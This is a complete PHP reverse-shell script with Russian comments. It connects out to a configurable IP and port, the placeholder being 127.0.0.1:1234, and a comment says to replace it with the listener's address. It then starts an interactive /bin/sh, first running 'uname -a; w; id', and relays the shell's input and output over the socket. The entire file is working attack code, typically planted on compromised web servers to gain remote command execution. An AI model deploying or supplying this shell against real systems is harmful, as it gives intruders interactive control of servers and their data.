<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // Замените на IP-адрес, куда должен подключаться реверс-шелл
$port = 1234;       // Замените на порт, который будет слушать удаленный сервер
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
// Создание сокета
if (($sock = fsockopen($ip, $port, $errno, $errstr)) === false) {
    echo "Ошибка создания сокета: $errstr ($errno)";
    exit(1);
}
// Выполнение оболочки
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin - канал, из которого дочерний процесс будет читать
   1 => array("pipe", "w"),  // stdout - канал, в который дочерний процесс будет записывать
   2 => array("pipe", "w")   // stderr - файл для записи
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    echo "Ошибка при открытии процесса";
    exit(1);
}
// Установка неблокирующего режима для потока
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
echo "Успешно: подключенный реверс-шелл к $ip:$port\n";
while (1) {
    // Проверка наличия конца файла на любом из потоков
    if (feof($sock)) {
        echo "Сервер прекратил соединение\n";
        break;
    }
    if (feof($pipes[1])) {
        echo "Процесс завершился\n";
        break;
    }
    // Чтение из и запись в сокеты/пайпы
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        if ($debug) echo "Чтение с сокета\n";
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    
    if (in_array($pipes[1], $read_a)) {
        if ($debug) echo "Чтение из stdout шелла\n";
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    
    if (in_array($pipes[2], $read_a)) {
        if ($debug) echo "Чтение из stderr шелла\n";
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($process);
?>
